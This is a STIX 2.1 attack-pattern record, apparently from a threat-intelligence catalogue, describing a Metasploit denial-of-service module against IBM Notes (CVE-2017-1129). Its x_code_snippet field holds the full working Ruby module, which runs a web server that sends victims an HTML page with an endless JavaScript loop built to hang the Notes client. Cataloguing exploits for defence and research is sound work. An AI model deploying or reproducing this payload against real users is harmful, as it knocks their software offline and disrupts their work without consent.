{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--664603c7-d823-450d-a27f-6bdd91b159d5",
    "created": "2024-08-14T16:25:59.475602Z",
    "modified": "2024-08-14T16:25:59.475606Z",
    "name": "\"IBM Notes encodeURI DOS\"",
    "description": "( This module exploits a vulnerability in the native browser that comes with IBM Lotus Notes. If successful, it could cause the Notes client to hang and have to be restarted. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/ibm_lotus_notes.rb",
            "external_id": "ibm_lotus_notes.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-1129"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg21999385"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'           => \"IBM Notes encodeURI DOS\",\n        'Description'    => %q(\n          This module exploits a vulnerability in the native browser that comes with IBM Lotus Notes.\n          If successful, it could cause the Notes client to hang and have to be restarted.\n        ),\n        'License'        => MSF_LICENSE,\n        'Author'         => [\n          'Dhiraj Mishra',\n        ],\n        'References'     => [\n          [ 'EDB', '42602'],\n          [ 'CVE', '2017-1129' ],\n          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21999385' ]\n        ],\n        'DisclosureDate' => '2017-08-31',\n        'Actions'        => [[ 'WebServer', 'Description' => 'Serve exploit via web server' ]],\n        'PassiveActions' => [ 'WebServer' ],\n        'DefaultAction'  => 'WebServer'\n      )\n    )\n  end\n\n  def run\n    exploit # start http server\n  end\n\n  def setup\n    @html = %|\n    <html><head><title>DOS</title>\n<script type=\"text/javascript\">\nwhile (true) try {\n                var object = { };\n                function d(d0) {\n                        var d0 = (object instanceof encodeURI)('foo');\n                }\n                d(75);\n        } catch (d) { }\n</script>\n</head></html>\n    |\n  end\n\n  def on_request_uri(cli, _request)\n    print_status('Sending response')\n    send_response(cli, @html)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-08-31"
}